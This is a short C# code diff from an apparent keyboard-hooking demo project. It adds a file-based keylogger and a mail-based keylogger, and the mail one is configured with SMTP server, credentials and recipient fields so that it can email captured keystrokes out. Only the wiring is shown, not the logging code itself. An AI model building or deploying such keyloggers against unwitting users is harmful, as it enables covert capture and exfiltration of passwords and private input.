@@ -17,7 +17,8 @@ namespace KeyHooking_Refactored {
 		IInputSimulator _simulator;
 		KeyBinder _binder;
 
-		KeyLogger _logger;
+		FileKeyLogger _fileLogger;
+		MailKeyLogger _mailLogger;
 		#endregion
 
 		#region Structing
@@ -47,8 +48,11 @@ namespace KeyHooking_Refactored {
 		#endregion
 
 		#region Logger demostration UI and Handlers
-		private void CB_makeLogger_Click(object sender, EventArgs e) {
-			_logger = new KeyLogger();
+		private void CB_makeFileLogger_Click(object sender, EventArgs e) {
+			_fileLogger = new FileKeyLogger("");
+		}
+		private void CB_makeMailLogger_Click(object sender, EventArgs e) {
+			_mailLogger = new MailKeyLogger(tb_serv.Text, Convert.ToInt32(nUD_port.Value), tb_from.Text, tb_pass.Text, tb_to.Text);
 		}
 		#endregion
 
